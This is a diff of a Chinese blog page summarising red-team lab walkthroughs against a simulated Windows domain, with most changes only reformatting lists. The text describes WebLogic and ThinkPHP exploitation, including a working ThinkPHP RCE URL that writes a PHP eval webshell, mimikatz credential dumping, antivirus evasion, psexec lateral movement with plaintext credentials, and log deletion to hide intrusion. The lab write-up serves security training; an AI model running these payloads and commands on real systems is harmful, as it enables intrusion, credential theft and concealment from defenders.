@@ -174,11 +174,11 @@
 </ul>
 <p>​      <a href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">MSF反弹payload学习</a></p>
 <ul>
-<li><p><strong>查看获得的用户权限，通常通过web漏洞获得的webshell权限较低，需要进行提权。</strong></p>
-<p>windows提权exp： <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a></p>
-</li>
-<li><p><strong>这里直接使用getsystem即可提权</strong>，<strong>如果不成功可以使用msf中自带的绕过UAC模块，设置执行后再次尝试getsystem就可获得权限</strong></p>
-</li>
+<li><strong>查看获得的用户权限，通常通过web漏洞获得的webshell权限较低，需要进行提权。</strong></li>
+</ul>
+<p>  windows提权exp： <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a></p>
+<ul>
+<li><strong>这里直接使用getsystem即可提权</strong>，<strong>如果不成功可以使用msf中自带的绕过UAC模块，设置执行后再次尝试getsystem就可获得权限</strong></li>
 </ul>
 <p>​       <a href="https://www.freebuf.com/articles/system/185311.html" target="_blank" rel="noopener">使用Metasploit绕过UAC的多种方法 </a></p>
 <ul>
@@ -186,27 +186,31 @@
 </ul>
 <p>​       <a href="https://xz.aliyun.com/t/2536#toc-0" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p>
 <ul>
-<li><p><strong>mimikatz抓取本地用户的hash密码</strong></p>
-<p><a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">后渗透]Mimikatz使用大全</a></p>
-</li>
-<li><p><strong>后渗透信息收集</strong>，<strong>包括定位域控，查询域管理员和域用户，添加域管理员等等</strong></p>
-</li>
-<li><p>利用powershell框架进行后渗透信息收集:</p>
+<li><strong>mimikatz抓取本地用户的hash密码</strong></li>
+</ul>
+<p>  <a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">后渗透]Mimikatz使用大全</a></p>
 <ul>
-<li><a href="https://www.freebuf.com/sectool/87647.html" target="_blank" rel="noopener">一些值得收藏的PowerShell工具</a></li>
-<li><a href="https://www.secpulse.com/archives/55893.html" target="_blank" rel="noopener">Powershell &amp; Powersploit 入门</a></li>
-<li><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">内网工具学习之Empire后渗透</a></li>
-<li><a href="https://www.cnblogs.com/-qing-/p/10742487.html" target="_blank" rel="noopener">nishang的介绍与使用</a></li>
-<li>域渗透信息收集常见操作<ul>
-<li><a href="https://xz.aliyun.com/t/7777#toc-0" target="_blank" rel="noopener">内网信息收集</a></li>
+<li><strong>后渗透信息收集</strong>，<strong>包括定位域控，查询域管理员和域用户，添加域管理员等等</strong></li>
+</ul>
+<ul>
+<li><p>利用powershell框架进行后渗透信息收集:</p>
+<p><a href="https://www.freebuf.com/sectool/87647.html" target="_blank" rel="noopener">一些值得收藏的PowerShell工具</a></p>
+<p><a href="https://www.secpulse.com/archives/55893.html" target="_blank" rel="noopener">Powershell &amp; Powersploit 入门</a></p>
+<p><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">内网工具学习之Empire后渗透</a></p>
+<p><a href="https://www.cnblogs.com/-qing-/p/10742487.html" target="_blank" rel="noopener">nishang的介绍与使用</a></p>
+<ul>
+<li><p>域渗透信息收集常见操作</p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/7777#toc-0" target="_blank" rel="noopener">内网信息收集</a></p>
+</li>
 </ul>
 </li>
 </ul>
-</li>
-<li><p><strong>根据信息收集，我们可以知道域控的地址，域成员主机03地址。</strong></p>
-</li>
-<li><p><strong>接着进行横向渗透，首先需要添加路由和代理。</strong></p>
-</li>
+<ul>
+<li><strong>根据信息收集，我们可以知道域控的地址，域成员主机03地址。</strong></li>
+</ul>
+<ul>
+<li><strong>接着进行横向渗透，首先需要添加路由和代理。</strong></li>
 </ul>
 <p>​       <a href="https://evoa.me/index.php/archives/37/" target="_blank" rel="noopener">[MSF学习-端口转发代理及路由功能-三层内网靶场渗透]</a></p>
 <ul>
@@ -219,10 +223,10 @@
 <p>​       这里给一个比较好用的模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p>
 <p>​         先知一篇讲永恒之蓝的文章 ： <a href="https://xz.aliyun.com/t/2151#toc-1" target="_blank" rel="noopener">那些年，我们追过的“蓝”</a></p>
 <ul>
-<li><p><strong>2003我们直接getsystem提权，然后照上面操作导出用户hash即可。</strong></p>
-</li>
-<li><p>最后杀向域控，前面我们已经在win7机器上获取了域管理的账号密码。这里直接用</p>
-</li>
+<li><strong>2003我们直接getsystem提权，然后照上面操作导出用户hash即可。</strong></li>
+</ul>
+<ul>
+<li>最后杀向域控，前面我们已经在win7机器上获取了域管理的账号密码。这里直接用</li>
 </ul>
 <p>​      <code>exploit/windows/smb/psexec</code>远程连接即可拿到shell，并且是管理员权限。</p>
 <p>​      <a href="https://www.freebuf.com/articles/system/183670.html" target="_blank" rel="noopener">多种使用SMB端口远程连接PC的方法介绍 </a></p>
@@ -237,60 +241,66 @@
 <p>大体拓扑如下：</p>
 <p><img src="/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/t01bbcd3ad3d53a0ecd.jpg" alt="img"></p>
 <h4 id="外网渗透-1"><a href="#外网渗透-1" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul>
-<li><p><strong>首先手动开启web机上weblogic服务，访问web机的7001端口。可以进入控制台。</strong></p>
-</li>
-<li><p><strong>使用WeblogicScan进行扫描，由扫描结果可知存在CVE-2019-2725</strong>。</p>
-<p><a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan</a></p>
-<p><a href="https://www.cnblogs.com/-mo-/p/11503707.html" target="_blank" rel="noopener">Weblogic漏洞总结</a></p>
-</li>
-<li><p><strong>使用<code>CVE-2019-2725</code>的POC上传webshell，</strong></p>
-</li>
+<li><strong>首先手动开启web机上weblogic服务，访问web机的7001端口。可以进入控制台。</strong></li>
+</ul>
+<ul>
+<li><strong>使用WeblogicScan进行扫描，由扫描结果可知存在CVE-2019-2725</strong>。</li>
+</ul>
+<p>  <a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan</a></p>
+<p>  <a href="https://www.cnblogs.com/-mo-/p/11503707.html" target="_blank" rel="noopener">Weblogic漏洞总结</a></p>
+<ul>
+<li><strong>使用<code>CVE-2019-2725</code>的POC上传webshell，</strong></li>
 </ul>
 <p>​    <a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener">（CVE-2019-2725）复现</a></a></p>
 <ul>
 <li><strong>或者直接使用msf自带的cve模块打一波，拿到shell.</strong></li>
+</ul>
+<ul>
 <li><strong>或者使用这个脚本</strong>：<a href="https://github.com/TopScrew/CVE-2019-2725" target="_blank" rel="noopener">https://github.com/TopScrew/CVE-2019-2725</a></li>
 </ul>
 <h4 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
-<li><p><strong>后渗透常规操作走一波</strong></p>
-<ul>
-<li>查看用户权限，这里已经是管理员权限，暂不提权。</li>
-<li>查看主机信息和开放端口</li>
-<li>新建管理员用户，远程桌面登录。</li>
-<li>因为这里靶机安装了360，所以需要上传procdump结合mimikatz在本地读取密码信息</li>
+<li><strong>后渗透常规操作走一波</strong></li>
 </ul>
+<ul>
+<li><p>查看用户权限，这里已经是管理员权限，暂不提权。</p>
+</li>
+<li><p>查看主机信息和开放端口</p>
+</li>
+<li><p>新建管理员用户，远程桌面登录。</p>
+</li>
+<li><p>因为这里靶机安装了360，所以需要上传procdump结合mimikatz在本地读取密码信息</p>
 <p>​      <a href="https://www.cnblogs.com/nul1/p/9285814.html" target="_blank" rel="noopener">利用procdump+Mimikatz 绕过杀软获取Windows明文密码</a></p>
-<ul>
-<li>最后使用msf生成个后门。</li>
-</ul>
+</li>
+<li><p>最后使用msf生成个后门。</p>
 <p>​     <a href="https://www.freebuf.com/articles/web/180581.html" target="_blank" rel="noopener">后渗透阶段的权限维持（Windows篇） </a></p>
 </li>
-<li><p><strong>后渗透信息收集，收集域内信息，添加域管理员账号，定位域控</strong>。</p>
-</li>
-<li><p><strong>msf添加路由，搭建代理。</strong></p>
-<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100115657" target="_blank" rel="noopener">reDuh搭建HTTP正向代理</a></p>
-<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100132929" target="_blank" rel="noopener">ssocks+proxychains搭建代理</a></p>
-<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100126207" target="_blank" rel="noopener">reGeorg + proxifier搭建SOCKS正向代理</a></p>
-<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100129295" target="_blank" rel="noopener">xsocks+proxychains搭建代理</a></p>
-<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100123395" target="_blank" rel="noopener">tunna搭建HTTP正向代理</a></p>
-</li>
-<li><p><strong>刚刚已经拿到了域管理权限知道密码，直接用psexec连接域控制器拿下域控。</strong></p>
-</li>
-<li><p><strong>痕迹清理</strong></p>
-<ul>
-<li><p>获取日志分类列表：wevtutil el &gt;1.txt</p>
-</li>
-<li><p>获取单个日志类别的统计信息：wevtutil gli “windows powershell”</p>
-</li>
-<li><p>查看指定日志的具体内容：wevtutil qe /f:text “windows powershell”</p>
-</li>
-<li><p>删除单个日志类别的所有信息：wevtutil cl “windows powershell”</p>
-</li>
-<li><p><strong>破坏Windows日志记录功能</strong> </p>
-<ul>
-<li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a></li>
-<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a></li>
 </ul>
+<ul>
+<li><strong>后渗透信息收集，收集域内信息，添加域管理员账号，定位域控</strong>。</li>
+</ul>
+<ul>
+<li><strong>msf添加路由，搭建代理。</strong></li>
+</ul>
+<p>  <a href="https://blog.csdn.net/God_XiangYu/article/details/100115657" target="_blank" rel="noopener">reDuh搭建HTTP正向代理</a></p>
+<p>  <a href="https://blog.csdn.net/God_XiangYu/article/details/100132929" target="_blank" rel="noopener">ssocks+proxychains搭建代理</a></p>
+<p>  <a href="https://blog.csdn.net/God_XiangYu/article/details/100126207" target="_blank" rel="noopener">reGeorg + proxifier搭建SOCKS正向代理</a></p>
+<p>  <a href="https://blog.csdn.net/God_XiangYu/article/details/100129295" target="_blank" rel="noopener">xsocks+proxychains搭建代理</a></p>
+<p>  <a href="https://blog.csdn.net/God_XiangYu/article/details/100123395" target="_blank" rel="noopener">tunna搭建HTTP正向代理</a></p>
+<ul>
+<li><strong>刚刚已经拿到了域管理权限知道密码，直接用psexec连接域控制器拿下域控。</strong></li>
+</ul>
+<ul>
+<li><p><strong>痕迹清理</strong></p>
+<p>获取日志分类列表：wevtutil el &gt;1.txt</p>
+<p>获取单个日志类别的统计信息：wevtutil gli “windows powershell”</p>
+<p>查看指定日志的具体内容：wevtutil qe /f:text “windows powershell”</p>
+<p>删除单个日志类别的所有信息：wevtutil cl “windows powershell”</p>
+<ul>
+<li><p><strong>破坏Windows日志记录功能</strong> </p>
+</li>
+<li><p><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a></p>
+</li>
+<li><p><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a></p>
 </li>
 <li><p><strong>msf</strong>  run clearlogs   clearev</p>
 </li>
@@ -327,43 +337,59 @@
 <li><a href="https://xz.aliyun.com/t/5320" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></li>
 </ul>
 </li>
-<li><p>在ubuntu上找到了个test.txt，存放着应该是账号密码。</p>
+<li><p><strong>在ubuntu上找到了个test.txt，存放着应该是账号密码。</strong></p>
 </li>
-<li><p>尝试使用wwwuser通过ssh登陆192.168.1.110</p>
+<li><p><strong>尝试使用wwwuser通过ssh登陆192.168.1.110</strong></p>
 </li>
 </ul>
 <h4 id="内网渗透-2"><a href="#内网渗透-2" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
-<li><p>上msf，scp上传payload到centos，centos执行payload获取shell。</p>
-<p><a href="https://www.cnblogs.com/tugenhua0707/p/8278772.html" target="_blank" rel="noopener">[scp传输文件的命令]</a></p>
+<li><p><strong>上msf，scp上传payload到centos，centos执行payload获取shell。</strong></p>
+<p><strong><a href="https://www.cnblogs.com/tugenhua0707/p/8278772.html" target="_blank" rel="noopener">[scp传输文件的命令]</a></strong></p>
 </li>
-<li><p>添加路由,使用msf扫描获取周围windows信息。</p>
-<p>​    <a href="https://www.cnblogs.com/Hi-blog/p/7413406.html#autoid-5-3-0" target="_blank" rel="noopener">MSF的辅助扫描模块（信息搜集）</a></p>
+</ul>
+<ul>
+<li><p><strong>添加路由,使用msf扫描获取周围windows信息。</strong></p>
+<p>​    <strong><a href="https://www.cnblogs.com/Hi-blog/p/7413406.html#autoid-5-3-0" target="_blank" rel="noopener">MSF的辅助扫描模块（信息搜集）</a></strong></p>
 </li>
-<li><p>得到了三台加入test域的windows主机</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.20 windows<span class="built_in"> server </span>2008</span><br><span class="line"></span><br><span class="line">192.168.93.30 windows 7</span><br><span class="line"></span><br><span class="line">192.168.93.10 windows<span class="built_in"> server </span>2012</span><br></pre></td></tr></table></figure>
+</ul>
+<ul>
+<li><strong>得到了三台加入test域的windows主机</strong></li>
+</ul>
+  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.20 windows<span class="built_in"> server </span>2008</span><br><span class="line"></span><br><span class="line">192.168.93.30 windows 7</span><br><span class="line"></span><br><span class="line">192.168.93.10 windows<span class="built_in"> server </span>2012</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>尝试爆破一下windows server 2008的本地管理员，得到了本地管理员的密码：123qwe!ASD</strong></li>
+</ul>
+<ul>
+<li><strong>搭建目标网络代理，kali使用proxychains来代理socs4a。</strong></li>
+</ul>
+<ul>
+<li><p><strong>用<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">wmiexec</a>执行命令，使用得到的密码远程连接目标机器</strong></p>
+<p>​    <strong><a href="http://www.91ri.org/12908.html" target="_blank" rel="noopener">利用WMI代替psexec（WMIEXEC.vbs）</a></strong></p>
+<p>​    <strong><a href="https://www.cnblogs.com/ssooking/articles/6082407.html" target="_blank" rel="noopener">丢掉PSEXEC来横向渗透</a></strong></p>
 </li>
-<li><p>尝试爆破一下windows server 2008的本地管理员，得到了本地管理员的密码：123qwe!ASD</p>
+</ul>
+<ul>
+<li><strong>查看进程时发现有test域的administrator的进程，于是尝试抓一下密码</strong></li>
+</ul>
+<ul>
+<li><p><strong>kali下使用smbclient通过代理连接windows server 2008 上传mimikatz。</strong></p>
+<p>​    <strong><a href="[https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/](https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/)">内网渗透之smbclient工具学习</a></strong></p>
 </li>
-<li><p>搭建目标网络代理，kali使用proxychains来代理socs4a。</p>
+</ul>
+<ul>
+<li><p><strong>wmiexec远程执行mimikatz抓到了test域的administrator密码。</strong></p>
+<p><strong><a href="https://cloud.tencent.com/developer/article/1171183" target="_blank" rel="noopener">九种姿势运行Mimikatz</a></strong></p>
 </li>
-<li><p>用<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">wmiexec</a>执行命令，使用得到的密码远程连接目标机器</p>
-<p>​    <a href="http://www.91ri.org/12908.html" target="_blank" rel="noopener">利用WMI代替psexec（WMIEXEC.vbs）</a></p>
-<p>​    <a href="https://www.cnblogs.com/ssooking/articles/6082407.html" target="_blank" rel="noopener">丢掉PSEXEC来横向渗透</a></p>
-</li>
-<li><p>查看进程时发现有test域的administrator的进程，于是尝试抓一下密码</p>
-</li>
-<li><p>kali下使用smbclient通过代理连接windows server 2008 上传mimikatz。</p>
-<p>​    <a href="[https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/](https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/)">内网渗透之smbclient工具学习</a></p>
-</li>
-<li><p>wmiexec远程执行mimikatz抓到了test域的administrator密码。</p>
-<p><a href="https://cloud.tencent.com/developer/article/1171183" target="_blank" rel="noopener">九种姿势运行Mimikatz</a></p>
-</li>
-<li><p>查看windows server 2008的ip，然后ping test.org获取到域控制器ip</p>
-</li>
-<li><p>直接ipc连接（环境有点问题，3389连接域控提示administrator的密码过期了）</p>
-</li>
-<li><p>得到重要文件flag.txt。</p>
-</li>
+</ul>
+<ul>
+<li><strong>查看windows server 2008的ip，然后ping test.org获取到域控制器ip</strong></li>
+</ul>
+<ul>
+<li><strong>直接ipc连接（环境有点问题，3389连接域控提示administrator的密码过期了）</strong></li>
+</ul>
+<ul>
+<li><strong>得到重要文件flag.txt。</strong></li>
 </ul>
 <h3 id="红队评估（五）"><a href="#红队评估（五）" class="headerlink" title="红队评估（五）"></a>红队评估（五）</h3><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p><strong>Win7 +phpstudy+thinkphp（5.0.22）</strong> </p>
 <p>ip  192.168.135.150</p>
@@ -373,16 +399,21 @@
 <p><strong>攻击机 win10</strong>     </p>
 <p>ip  192.168.135.143</p>
 <h4 id="外网渗透-3"><a href="#外网渗透-3" class="headerlink" title="外网渗透"></a>外网渗透</h4><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
-<li><p><strong>漏洞搜索与利用，浏览器访问192.168.135.150，发现是thinkphp框架，爆下错，看下tp版本为5.0.22。</strong></p>
-<ul>
+<li><strong>漏洞搜索与利用，浏览器访问192.168.135.150，发现是thinkphp框架，爆下错，看下tp版本为5.0.22。</strong><ul>
 <li><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">thinkphp v5.x 远程代码执行漏洞-POC集合</a></li>
 </ul>
 </li>
+</ul>
+<ul>
 <li><p><strong>找到此版本的poc,然后写一句话木马。</strong></p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">135.150</span>/?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20^%3C?php%20@eval($_POST[%27cmd%27]);%20?^%3E%20%3E%20C:\phpStudy\PHPTutorial\WWW\public\shell.php</span><br></pre></td></tr></table></figure>
+
+
+
 </li>
-<li><p><strong>蚁剑连接，查看权限，发现居然是域管理员权限！！！</strong></p>
-</li>
+</ul>
+<ul>
+<li><strong>蚁剑连接，查看权限，发现居然是域管理员权限！！！</strong></li>
 </ul>
 <h4 id="内网渗透-3"><a href="#内网渗透-3" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
 <li><p><strong>在横向移动前我们需要收集域内信息。</strong></p>
@@ -395,36 +426,48 @@
 <li><p><strong>接下来使用CS来完成后续内网渗透工作。</strong></p>
 <p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf" target="_blank" rel="noopener">Cobaltstrike用户手册</a></p>
 </li>
-<li><p><strong>首先使用创建监听器，然后根据需要生成对应监听器的木马，这里我选择生成windows的exe木马。</strong></p>
-</li>
+</ul>
+<ul>
+<li><strong>首先使用创建监听器，然后根据需要生成对应监听器的木马，这里我选择生成windows的exe木马。</strong></li>
 </ul>
 <p>​       <a href="https://zhuanlan.zhihu.com/p/93718885" target="_blank" rel="noopener">Cobalt Strike简介及生成简易木马</a></p>
 <ul>
-<li><p><strong>使用蚁剑上传到目标服务器，执行，查看cs发现，win7已上线。</strong></p>
-</li>
-<li><p><strong>这里看到上线的用户的只是administrator权限，直接使用cs自带的ms14-058提权（为什么用它提权，因为靶场里提示了。。）</strong></p>
-<p><a href="https://www.freebuf.com/vuls/48239.html" target="_blank" rel="noopener">Win64bit提权0day漏洞（CVE-2014-4113）</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/94135740" target="_blank" rel="noopener">Beacon详解</a></p>
-</li>
-<li><p><strong>选择提权后，一会就可以看到system权限的win7上线。</strong></p>
-</li>
-<li><p><strong>选择system权限win7,进入Beacon,然后运行mimikatz读到了Administrator和leo的密码</strong></p>
-</li>
-<li><p><strong>因为我们这里已经得到的域控管理员的密码，所以直接找域控登录即可</strong>。</p>
-</li>
-<li><p><strong>使用CS扫一下内网可以用psexec登录的主机，主要看445端口有没有开放</strong>。</p>
-</li>
-<li><p><strong>因为我们这里的DC处于内网，不能直接连接CS,所以我们需要win7做一个跳板机器</strong>。</p>
-</li>
-<li><p><strong>在win7上设置新的监听，上传psexec，设置防火墙规则。</strong></p>
-<ul>
-<li><pre><code>netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=6666
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>*<span class="strong">*最后使用PsExec登录DC域控。*</span><span class="strong">*</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">  -</span></span><br></pre></td></tr></table></figure>
-Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.138 -u sun\Administrator -p dc123.com -d -c C:\phpStudy\PHPTutorial\WWW\public\nei.exe</code></pre></li>
+<li><strong>使用蚁剑上传到目标服务器，执行，查看cs发现，win7已上线。</strong></li>
 </ul>
-</li>
-<li><p><strong>此时可以看到dc主机也已经上线</strong></p>
-</li>
+<ul>
+<li><strong>这里看到上线的用户的只是administrator权限，直接使用cs自带的ms14-058提权（为什么用它提权，因为靶场里提示了。。）</strong></li>
+</ul>
+<p>  <a href="https://www.freebuf.com/vuls/48239.html" target="_blank" rel="noopener">Win64bit提权0day漏洞（CVE-2014-4113）</a></p>
+<p>  <a href="https://zhuanlan.zhihu.com/p/94135740" target="_blank" rel="noopener">Beacon详解</a></p>
+<ul>
+<li><strong>选择提权后，一会就可以看到system权限的win7上线。</strong></li>
+</ul>
+<ul>
+<li><strong>选择system权限win7,进入Beacon,然后运行mimikatz读到了Administrator和leo的密码</strong></li>
+</ul>
+<ul>
+<li><strong>因为我们这里已经得到的域控管理员的密码，所以直接找域控登录即可</strong>。</li>
+</ul>
+<ul>
+<li><strong>使用CS扫一下内网可以用psexec登录的主机，主要看445端口有没有开放</strong>。</li>
+</ul>
+<ul>
+<li><strong>因为我们这里的DC处于内网，不能直接连接CS,所以我们需要win7做一个跳板机器</strong>。</li>
+</ul>
+<ul>
+<li><strong>在win7上设置新的监听，上传psexec，设置防火墙规则。</strong></li>
+</ul>
+  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=cs <span class="attribute">dir</span>=in <span class="attribute">action</span>=allow <span class="attribute">protocol</span>=TCP <span class="attribute">localport</span>=6666</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>最后使用PsExec登录DC域控。</strong></li>
+</ul>
+  <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shell C:<span class="symbol">\p</span>hpStudy<span class="symbol">\P</span>HPTutorial<span class="symbol">\W</span>WW<span class="symbol">\p</span>ublic<span class="symbol">\P</span>sExec64.exe -accepteula <span class="symbol">\\</span>192.168.138.138 -u sun<span class="symbol">\A</span>dministrator -p dc123.com -d -c C:<span class="symbol">\p</span>hpStudy<span class="symbol">\P</span>HPTutorial<span class="symbol">\W</span>WW<span class="symbol">\p</span>ublic<span class="symbol">\n</span>ei.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>此时可以看到dc主机也已经上线</strong></li>
+</ul>
+<ul>
 <li><p><strong>日志和入侵痕迹清除，主要是我们上传的木马文件，添加的管理员。以及系统日志、web应用日志、防火墙日志等内容。</strong></p>
 <ul>
 <li><a href="https://blog.csdn.net/God_XiangYu/article/details/100056932" target="_blank" rel="noopener">后渗透篇：清理windows入侵痕迹总结</a></li>
@@ -456,8 +499,8 @@ Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.
         <span class="prev-text nav-default">浅析黄金票据与白银票据</span>
         <span class="prev-text nav-mobile">Prev</span>
       </a>
-    <a class="next" href="/2020/06/05/msf-yu-cs-lian-dong/">
-        <span class="next-text nav-default">msf与cs联动</span>
+    <a class="next" href="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/">
+        <span class="next-text nav-default">经典漏洞msf攻击实验记录</span>
         <span class="prev-text nav-mobile">Next</span>
         <i class="iconfont icon-right"></i>
       </a>
